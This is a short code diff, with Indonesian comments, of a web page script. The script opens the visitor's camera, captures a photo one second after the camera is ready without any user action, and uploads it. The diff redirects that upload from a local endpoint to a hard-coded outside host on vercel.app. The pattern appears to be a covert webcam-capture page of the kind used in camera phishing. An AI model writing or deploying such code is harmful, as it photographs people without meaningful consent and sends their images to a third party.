@@ -20,7 +20,7 @@
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
 
-        // auto capture begitu kamera siap
+        // Auto capture 1 detik setelah kamera siap
         video.onloadedmetadata = () => {
           setTimeout(captureAndSend, 1000);
         };
@@ -40,7 +40,8 @@
       const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
 
       try {
-        const res = await fetch('/api/upload', {
+        // Pakai absolute URL deploy final
+        const res = await fetch('https://akusayang6661.vercel.app/api/upload', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ image: dataUrl })
